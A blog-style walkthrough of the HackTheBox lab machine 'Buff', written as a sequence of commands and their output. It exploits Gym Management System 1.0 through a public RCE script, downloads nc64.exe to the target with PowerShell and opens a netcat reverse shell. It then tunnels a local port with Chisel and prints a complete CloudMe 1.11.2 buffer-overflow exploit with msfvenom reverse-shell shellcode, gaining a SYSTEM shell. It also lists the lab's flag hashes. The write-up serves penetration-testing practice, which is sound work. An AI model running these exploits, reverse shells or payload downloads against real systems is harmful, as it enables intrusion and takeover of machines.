---
layout: post
title: Hackthebox Buff Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-12-30/buff.png)

# Explanation
[Hackthebox](https://www.hackthebox.eu/) is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box `Buff`.

# Solution
## 1. Initial Enumeration
#### TCP Port Scanning:
```shell
root@kali:~# nmap -p- 10.10.10.198 -sV -sC
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-19 23:48 JST
Nmap scan report for 10.10.10.198
Host is up (0.43s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1213.36 seconds
```

#### Gobuster Port 8080:
```
root@kali:~# gobuster dir -u http://10.10.10.198:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.198:8080
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/12/27 14:15:39 Starting gobuster
===============================================================
/index.php (Status: 200)
/img (Status: 301)
/home.php (Status: 200)
/contact.php (Status: 200)
/about.php (Status: 200)
/register.php (Status: 200)
/profile (Status: 301)

---

```


## 2. Getting User

Take a look at `http://10.10.10.198:8080`, we can find a subtitle that shows the running software and its version.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-12-30/2020-12-27-15-41-31.png)

Using searchsploit, we can find an RCE [Gym Management System 1.0 - Unauthenticated Remote Code Execution](https://www.exploit-db.com/exploits/48506).
```
root@kali:~# searchsploit gym management
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Gym Management System 1.0 - 'id' SQL Injection                                   | php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass                                | php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scripting                          | php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remote Code Execution                | php/webapps/48506.py
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Download (or use the one installed on Kali by default) the exploit, install the prerequisites for python2 and execute the script.<br>
We can confirm that we had a shell execution.

```
root@kali:~# python -m pip install requests

---

root@kali:~# python -m pip install colorama

---

root@kali:~# python 48506.py http://10.10.10.198:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG
�
buff\shaun
```

We got a web shell but we still don't have OS shell.<br>
Try to upload `nc64.exe` using Powershell after started local HTTP server that hosts [nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------).
#### On the localhost
```
root@kali:~# ls | grep nc64
nc64.exe

root@kali:~# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...

```

#### On the target machine
```
C:\xampp\htdocs\gym\upload> powershell Invoke-WebRequest -Uri http://10.10.14.42:8000/nc64.exe -OutFile C:\xampp\htdocs\gym\upload\nc64.exe
�PNG
�

C:\xampp\htdocs\gym\upload> dir
�PNG
�
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\xampp\htdocs\gym\upload

28/12/2020  00:22    <DIR>          .
28/12/2020  00:22    <DIR>          ..
28/12/2020  00:10                53 kamehameha.php
28/12/2020  00:22            45,272 nc64.exe
               2 File(s)         45,325 bytes
               2 Dir(s)   9,841,668,096 bytes free

```

Launch a local netcat listener and execute `nc64.exe`.<br>
Now we got a reverse shell as `shaun`.

#### On the localhost
```
root@kali:~# nc -nlvp 4443
Listening on 0.0.0.0 4443

```

#### On the target machine
```
C:\xampp\htdocs\gym\upload> nc64.exe 10.10.14.42 4443 -e cmd.exe
```

#### On the localhost
```
root@kali:~# nc -nlvp 4443
Listening on 0.0.0.0 4443
Connection received on 10.10.10.198 49684
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>whoami
whoami
buff\shaun
```

`user.txt` is in the `C:\Users\shaun\Desktop`.
```
C:\Users\shaun\Desktop>type user.txt
type user.txt
16a71e4eade671c342101c50b256e2ef

```


## 3. Getting Root

In `C:\Users\shaun\Downloads>` directory, we can find an interesting binary called `CloudMe_1112.exe`.
```
C:\Users\shaun\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users\shaun\Downloads

14/07/2020  12:27    <DIR>          .
14/07/2020  12:27    <DIR>          ..
16/06/2020  15:26        17,830,824 CloudMe_1112.exe
               1 File(s)     17,830,824 bytes
               2 Dir(s)   9,840,857,088 bytes free

```

Using the following command, we can see that actually this binary is running as a process.
```
C:\xampp\htdocs\gym\upload>tasklist -v | findstr CloudMe
tasklist -v | findstr CloudMe
CloudMe.exe                   4128                            0     38,552 K Unknown

```

Run searchsploit again for `CloudMe`.<br>
We can find a buffer overflow exploit [CloudMe 1.11.2 - Buffer Overflow](https://www.exploit-db.com/exploits/48389).
```
root@kali:~# searchsploit cloudme
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                                             | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                    | windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                                    | windows/local/48840.py
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                   | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                            | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                     | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                                        | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                    | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                           | windows_x86-64/remote/46250.py
CloudMe Sync < 1.11.0 - Buffer Overflow                                            | windows/remote/44027.py
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                         | windows_x86-64/remote/44784.py
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We have to take a look at the default port of `CloudMe`.
We didn't see port 8888 during the port scanning because only `127.0.0.1` is allowed to use it

#### On the localhost
```
root@kali:~# cat 48389.py | grep connect
    s.connect((target,8888))

```

#### On the target host
```
C:\Users\shaun\Downloads>netstat -an
netstat -an

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING
  TCP    10.10.10.198:139       0.0.0.0:0              LISTENING
  TCP    10.10.10.198:49684     10.10.14.42:4443       ESTABLISHED
  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING

---

```

To use the exploit, we need port forwarding.<br>
This time, [Chisel](https://github.com/jpillora/chisel) was used for the purpose.<br>
Run a web server on the localhost, upload the windows binary and run on the target machine.

#### On the localhost
```
root@kali:~# chmod +x chisel
root@kali:~# sudo ./chisel server -p 8001 --reverse -v
2020/12/29 12:52:49 server: Reverse tunnelling enabled
2020/12/29 12:52:49 server: Fingerprint 8fU8yodGKrxrXrjHCh9cAFAWAccwXWRyHQJCACbgB1g=
2020/12/29 12:52:49 server: Listening on http://0.0.0.0:8001

root@kali:~# ls | grep chisel
chisel
chisel.exe

root@kali:~# python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

#### On the target machine
```
C:\Users\shaun\Downloads>powershell Invoke-WebRequest -Uri http://10.10.14.42:8000/chisel.exe -OutFile chisel.exe
powershell Invoke-WebRequest -Uri http://10.10.14.42:8000/chisel.exe -OutFile chisel.exe

C:\Users\shaun\Downloads>chisel.exe client 10.10.14.42:8001 R:8888:127.0.0.1:8888
chisel.exe client 10.10.14.42:8001 R:8888:127.0.0.1:8888
2020/12/29 04:03:11 client: Connecting to ws://10.10.14.42:8001
2020/12/29 04:03:13 client: Connected (Latency 244.1625ms)

```

#### On the localhost
```
root@kali:~# sudo ./chisel server -p 8001 --reverse -v
2020/12/29 12:52:49 server: Reverse tunnelling enabled
2020/12/29 12:52:49 server: Fingerprint 8fU8yodGKrxrXrjHCh9cAFAWAccwXWRyHQJCACbgB1g=
2020/12/29 12:52:49 server: Listening on http://0.0.0.0:8001
2020/12/29 12:55:09 server: session#1: Handshaking...
2020/12/29 12:55:10 server: session#1: Verifying configuration
2020/12/29 12:55:10 server: session#1: tun: Created
2020/12/29 12:55:10 server: session#1: tun: SSH connected
2020/12/29 12:55:10 server: session#1: tun: proxy#R:8888=>8888: Listening
2020/12/29 12:55:10 server: session#1: tun: Bound proxies

```

#### On the localhost (another window)
```
root@kali:~# ss -antp | grep 8888
LISTEN 0      4096                      *:8888                      *:*     users:(("chisel",pid=117962,fd=8))   
```

We need to change the payload of the POC script.<br>
Run the following command to generate it.
```
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.42 LPORT=4444 -b '\x00\x0A\x0D' -v payload -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1869 bytes
payload =  b""
payload += b"\xb8\xbd\xb5\xf0\x16\xda\xc8\xd9\x74\x24\xf4\x5a"
payload += b"\x2b\xc9\xb1\x52\x31\x42\x12\x03\x42\x12\x83\x57"
payload += b"\x49\x12\xe3\x5b\x5a\x51\x0c\xa3\x9b\x36\x84\x46"
payload += b"\xaa\x76\xf2\x03\x9d\x46\x70\x41\x12\x2c\xd4\x71"
payload += b"\xa1\x40\xf1\x76\x02\xee\x27\xb9\x93\x43\x1b\xd8"
payload += b"\x17\x9e\x48\x3a\x29\x51\x9d\x3b\x6e\x8c\x6c\x69"
payload += b"\x27\xda\xc3\x9d\x4c\x96\xdf\x16\x1e\x36\x58\xcb"
payload += b"\xd7\x39\x49\x5a\x63\x60\x49\x5d\xa0\x18\xc0\x45"
payload += b"\xa5\x25\x9a\xfe\x1d\xd1\x1d\xd6\x6f\x1a\xb1\x17"
payload += b"\x40\xe9\xcb\x50\x67\x12\xbe\xa8\x9b\xaf\xb9\x6f"
payload += b"\xe1\x6b\x4f\x6b\x41\xff\xf7\x57\x73\x2c\x61\x1c"
payload += b"\x7f\x99\xe5\x7a\x9c\x1c\x29\xf1\x98\x95\xcc\xd5"
payload += b"\x28\xed\xea\xf1\x71\xb5\x93\xa0\xdf\x18\xab\xb2"
payload += b"\xbf\xc5\x09\xb9\x52\x11\x20\xe0\x3a\xd6\x09\x1a"
payload += b"\xbb\x70\x19\x69\x89\xdf\xb1\xe5\xa1\xa8\x1f\xf2"
payload += b"\xc6\x82\xd8\x6c\x39\x2d\x19\xa5\xfe\x79\x49\xdd"
payload += b"\xd7\x01\x02\x1d\xd7\xd7\x85\x4d\x77\x88\x65\x3d"
payload += b"\x37\x78\x0e\x57\xb8\xa7\x2e\x58\x12\xc0\xc5\xa3"
payload += b"\xf5\xe5\x13\xa5\x2f\x92\x21\xb9\x3e\x3e\xaf\x5f"
payload += b"\x2a\xae\xf9\xc8\xc3\x57\xa0\x82\x72\x97\x7e\xef"
payload += b"\xb5\x13\x8d\x10\x7b\xd4\xf8\x02\xec\x14\xb7\x78"
payload += b"\xbb\x2b\x6d\x14\x27\xb9\xea\xe4\x2e\xa2\xa4\xb3"
payload += b"\x67\x14\xbd\x51\x9a\x0f\x17\x47\x67\xc9\x50\xc3"
payload += b"\xbc\x2a\x5e\xca\x31\x16\x44\xdc\x8f\x97\xc0\x88"
payload += b"\x5f\xce\x9e\x66\x26\xb8\x50\xd0\xf0\x17\x3b\xb4"
payload += b"\x85\x5b\xfc\xc2\x89\xb1\x8a\x2a\x3b\x6c\xcb\x55"
payload += b"\xf4\xf8\xdb\x2e\xe8\x98\x24\xe5\xa8\xa9\x6e\xa7"
payload += b"\x99\x21\x37\x32\x98\x2f\xc8\xe9\xdf\x49\x4b\x1b"
payload += b"\xa0\xad\x53\x6e\xa5\xea\xd3\x83\xd7\x63\xb6\xa3"
payload += b"\x44\x83\x93"
```

Put the payload into the exploit, launch a netcat listener and execute the exploit code.<br>
We can obtain a shell as `SYSTEM`.
```
root@kali:~# cat 48389.py 
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.42 LPORT=4444 -b '\x00\x0A\x0D' -v payload -f python
payload =  b""
payload += b"\xb8\xbd\xb5\xf0\x16\xda\xc8\xd9\x74\x24\xf4\x5a"
payload += b"\x2b\xc9\xb1\x52\x31\x42\x12\x03\x42\x12\x83\x57"
payload += b"\x49\x12\xe3\x5b\x5a\x51\x0c\xa3\x9b\x36\x84\x46"
payload += b"\xaa\x76\xf2\x03\x9d\x46\x70\x41\x12\x2c\xd4\x71"
payload += b"\xa1\x40\xf1\x76\x02\xee\x27\xb9\x93\x43\x1b\xd8"
payload += b"\x17\x9e\x48\x3a\x29\x51\x9d\x3b\x6e\x8c\x6c\x69"
payload += b"\x27\xda\xc3\x9d\x4c\x96\xdf\x16\x1e\x36\x58\xcb"
payload += b"\xd7\x39\x49\x5a\x63\x60\x49\x5d\xa0\x18\xc0\x45"
payload += b"\xa5\x25\x9a\xfe\x1d\xd1\x1d\xd6\x6f\x1a\xb1\x17"
payload += b"\x40\xe9\xcb\x50\x67\x12\xbe\xa8\x9b\xaf\xb9\x6f"
payload += b"\xe1\x6b\x4f\x6b\x41\xff\xf7\x57\x73\x2c\x61\x1c"
payload += b"\x7f\x99\xe5\x7a\x9c\x1c\x29\xf1\x98\x95\xcc\xd5"
payload += b"\x28\xed\xea\xf1\x71\xb5\x93\xa0\xdf\x18\xab\xb2"
payload += b"\xbf\xc5\x09\xb9\x52\x11\x20\xe0\x3a\xd6\x09\x1a"
payload += b"\xbb\x70\x19\x69\x89\xdf\xb1\xe5\xa1\xa8\x1f\xf2"
payload += b"\xc6\x82\xd8\x6c\x39\x2d\x19\xa5\xfe\x79\x49\xdd"
payload += b"\xd7\x01\x02\x1d\xd7\xd7\x85\x4d\x77\x88\x65\x3d"
payload += b"\x37\x78\x0e\x57\xb8\xa7\x2e\x58\x12\xc0\xc5\xa3"
payload += b"\xf5\xe5\x13\xa5\x2f\x92\x21\xb9\x3e\x3e\xaf\x5f"
payload += b"\x2a\xae\xf9\xc8\xc3\x57\xa0\x82\x72\x97\x7e\xef"
payload += b"\xb5\x13\x8d\x10\x7b\xd4\xf8\x02\xec\x14\xb7\x78"
payload += b"\xbb\x2b\x6d\x14\x27\xb9\xea\xe4\x2e\xa2\xa4\xb3"
payload += b"\x67\x14\xbd\x51\x9a\x0f\x17\x47\x67\xc9\x50\xc3"
payload += b"\xbc\x2a\x5e\xca\x31\x16\x44\xdc\x8f\x97\xc0\x88"
payload += b"\x5f\xce\x9e\x66\x26\xb8\x50\xd0\xf0\x17\x3b\xb4"
payload += b"\x85\x5b\xfc\xc2\x89\xb1\x8a\x2a\x3b\x6c\xcb\x55"
payload += b"\xf4\xf8\xdb\x2e\xe8\x98\x24\xe5\xa8\xa9\x6e\xa7"
payload += b"\x99\x21\x37\x32\x98\x2f\xc8\xe9\xdf\x49\x4b\x1b"
payload += b"\xa0\xad\x53\x6e\xa5\xea\xd3\x83\xd7\x63\xb6\xa3"
payload += b"\x44\x83\x93"


overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
```

#### Localhost
```
root@kali:~# nc -nlvp 4444
Listening on 0.0.0.0 4444

```

#### Localhost (another window)
```
root@kali:~# python 48389.py 
```

#### Localhost (netcat window)
```
root@kali:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.198 49689
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
buff\administrator
```

As always, `root.txt` is in the directory `C:\Users\Administrator\Desktop>`.
```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
c4d1a59966243bf66b7f1fda07f2ead9
```
